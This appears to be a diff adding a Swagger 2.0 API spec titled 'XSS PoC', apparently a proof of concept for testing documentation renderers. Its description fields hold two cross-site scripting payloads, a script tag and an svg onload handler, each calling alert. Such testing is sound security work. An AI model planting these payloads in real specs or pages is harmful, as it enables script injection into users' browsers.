@@ -1,0 +1,12 @@
+swagger: "2.0"
+info:
+  title: "XSS PoC"
+  description: "<script>alert('XSS')</script>"
+paths:
+  /test:
+    get:
+      summary: "Test"
+      description: "<svg onload=alert('XSS')>"
+      responses:
+        '200':
+          description: "Success"
